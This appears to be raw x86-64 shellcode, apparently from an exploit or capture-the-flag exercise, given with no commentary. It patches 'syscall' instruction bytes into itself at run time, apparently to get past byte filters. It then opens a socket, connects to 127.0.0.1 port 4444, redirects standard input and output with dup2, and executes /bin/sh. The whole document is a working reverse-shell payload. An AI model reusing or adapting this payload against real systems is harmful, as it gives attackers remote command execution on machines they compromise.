mov r14w, 0x050f
mov word ptr [rdx + 0x2d], r14w
mov word ptr [rdx + 0x47], r14w
mov word ptr [rdx + 0x4e], r14w
mov word ptr [rdx + 0x59], r14w
mov word ptr [rdx + 0x79], r14w
mov dil, 0x2
mov rsi, 0x1
mov rdx, r15
mov al, 0x29
mov bl, 0xcc
mov rdi, rax
mov r8, 0x0100007f5c110002
mov qword ptr [rsp], r8
mov rsi, rsp
mov dl, 0x10
mov al, 0x2a
mov bl, 0xcc
mov rsi, r15
mov al, 0x21
mov bl, 0xcc
mov rsi, 0x1
mov al, 0x21
mov bl, 0xcc
mov r8, 0x68732f6e69622f
mov qword ptr [rsp], r8
mov rax, 0x3b
mov rsi, r15
mov rdx, r15
mov rdi, rsp
end
